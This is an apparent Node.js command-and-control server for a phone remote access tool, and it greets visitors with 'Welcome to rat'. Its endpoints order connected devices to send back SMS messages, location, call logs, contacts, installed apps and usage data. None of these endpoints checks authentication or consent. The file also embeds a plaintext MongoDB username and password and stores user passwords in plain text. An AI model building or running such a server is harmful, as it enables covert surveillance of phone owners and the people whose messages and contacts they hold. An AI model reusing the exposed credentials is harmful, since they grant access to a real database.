const express = require('express');
const socketToId = new Map(); //socket.id to id
const idToSocket = new Map(); //mobileid to socket.id
const idToConnectionSocket = new Map(); //mobileid to socket
const { createServer } = require('http');
const socketIo = require('socket.io');
const mongoose = require('mongoose');
const cors = require('cors');
const User = require('./models/Users');

mongoose.connect(`mongodb+srv://shreesamal1502:UoTwTt6dAG8r2mnl@cluster0.vqu96ih.mongodb.net/?retryWrites=true&w=majority`).then(()=>{
    console.log("connected to db");
})

const app = express();

app.use(cors({
    origin: '*',
}));

const server = createServer(app);
const io = socketIo(server,{
    cors: {
      origin: '*',
      methods: ['GET', 'POST'],
    },
});

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.send("Welcome to rat");
});

app.post('/register', async (req, res) => {
    const {name, phone, email, password, device_id, token, parent_id} = req.body;
    const user = new User({
        name, phone, email, password, device_id, token, parent_id
    });
    try{
        const savedUser = await user.save();
        res.json(savedUser);
    }catch(err){
        res.json({message:err});
    }
});

app.post('/login', async (req, res) => {
  const {email, password} = req.body;
  //remove callback
  const user = await User.findOne({email:email});
  if(user.password == password){
    res.json(user);
  }else{
    res.json({error:"user not found"});
  }
});

app.post('/update-token', async (req, res) => {
  const {id, token} = req.body;
  const user = await User.findOneAndUpdate({device_id:id}, {token:token});
  if(user){
    res.json(user);
  }else{
    res.json({error:"user not found"});
  }
});

app.get('/get-token/:id', async (req, res) => {
  const id = req.params.id;
  const user = await User.findOne({device_id:id});
  if(user){
    res.json({"token":user.token});
  }else{
    res.json({error:"user not found"});
  }
});

app.get('/get-parent-token/:id', async (req, res) => { 
  const id = req.params.id;
  var user = await User.findOne({device_id:id});
  if(user){
    user = await User.findOne({device_id:user.parent_id});
    res.json({token:user.token});
  }
  else{
    res.json({error:"user not found"});
  }
});

app.get('/sms/:id', async (req, res)=>{
    const id = req.params.id;
    const socketId = idToSocket.get(id);
    io.to(socketId).emit('sms', "get sms");
    try{
    const smsData = await new Promise((resolve, reject) => {
        if(!idToConnectionSocket.has(id)) reject({"error":"No connection socket"});
        idToConnectionSocket.get(id).once("sms", (data) => {
          resolve({"sms":data});
        });
      });
      // Send the received 'smsData' as a JSON response
      res.json(smsData);
    }catch(e){
        res.json(e);
    }
});

app.get('/location/:id', async (req, res)=>{
    const id = req.params.id;
    const socketId = idToSocket.get(id);
    io.to(socketId).emit('location', "get location");
    try{
    const locationData = await new Promise((resolve, reject) => {
        if(!idToConnectionSocket.has(id)) reject({"error":"No connection socket"});
        idToConnectionSocket.get(id).once("location", (data) => {
          resolve({"location":data});
        });
      });
      // Send the received 'smsData' as a JSON response
      res.json(locationData);
    }catch(e){
        res.json(e);
    }
});

app.get('/calls/:id', async (req, res)=>{
    const id = req.params.id;
    const socketId = idToSocket.get(id);
    io.to(socketId).emit('calllogs', "get callLogs");
    try{
    const locationData = await new Promise((resolve, reject) => {
        if(!idToConnectionSocket.has(id)) reject({"error":"No connection socket"});
        idToConnectionSocket.get(id).once("calllogs", (data) => {
          resolve({"call_logs":data});
        });
      });
      // Send the received 'smsData' as a JSON response
      res.json(locationData);
    }catch(e){
        res.json(e);
    }
});

app.get('/contacts/:id', async (req, res)=>{
    const id = req.params.id;
    const socketId = idToSocket.get(id);
    io.to(socketId).emit('contacts', "get contacts");
    try{
    const locationData = await new Promise((resolve, reject) => {
        if(!idToConnectionSocket.has(id)) reject({"error":"No connection socket"});
        idToConnectionSocket.get(id).once("contacts", (data) => {
          resolve({"contacts":data});
        });
      });
      // Send the received 'smsData' as a JSON response
      res.json(locationData);
    }catch(e){
        res.json(e);
    }
});

app.get('/installed-apps/:id', async (req, res)=>{
  const id = req.params.id;
  const socketId = idToSocket.get(id);
  io.to(socketId).emit('installed:apps', "get installed apps");
  try{
  const appData = await new Promise((resolve, reject) => {
      if(!idToConnectionSocket.has(id)) reject({"error":"No connection socket"});
      idToConnectionSocket.get(id).once("installed:apps", (data) => {
        resolve({"apps":data});
      });
    });
    
    res.json(appData);
  }catch(e){
      res.json(e);
  }
});

app.get('/usage/:id', async (req, res)=>{
  const id = req.params.id;
  const socketId = idToSocket.get(id);
  io.to(socketId).emit('usage', "get installed apps");
  try{
  const appData = await new Promise((resolve, reject) => {
      if(!idToConnectionSocket.has(id)) reject({"error":"No connection socket"});
      idToConnectionSocket.get(id).once("usage", (data) => {
        resolve({"usage":data});
      });
    });
    
    res.json(appData);
  }catch(e){
      res.json(e);
  }
});

//io operations
io.on("connection", (socket) => {
    console.log("device connected");
    socket.on("register", (id) => {
        socketToId.set(socket.id, id);
        idToSocket.set(id, socket.id);
        idToConnectionSocket.set(id, socket);
        console.log(`registered: ${id}`);
    });
    socket.on("disconnect", () => {
        var id = socketToId.get(socket.id);
        socketToId.delete(socket.id);
        idToSocket.delete(id);
        idToConnectionSocket.delete(id);
        console.log("user disconnected");
        console.log(socketToId, idToSocket, idToConnectionSocket);
    });
});
// Start the server
const PORT = process.env.PORT || 8000;
server.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
